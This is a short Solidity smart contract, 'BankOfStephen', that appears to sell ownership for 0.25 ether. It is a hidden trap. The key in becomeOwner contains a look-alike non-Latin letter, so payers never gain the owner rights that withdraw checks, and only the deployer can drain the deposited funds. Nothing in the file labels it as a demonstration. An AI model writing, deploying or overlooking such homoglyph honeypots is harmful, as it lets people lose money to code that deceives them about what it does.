pragma solidity ^0.4.24;

contract BankOfStephen {
    uint a;
    uint b;
    mapping(bytes32 => address) private owner;

    constructor() public {
        b = 10;
        owner["Stephen"] = msg.sender;
    }

    function becomeOwner() public payable {
        require(msg.value >= 0.25 ether);
        owner["Stephеn"] = msg.sender;
    }

    function withdraw() public {
        require(owner["Stephen"] == msg.sender);
        msg.sender.transfer(address(this).balance);
    }

    // function() public payable {}
}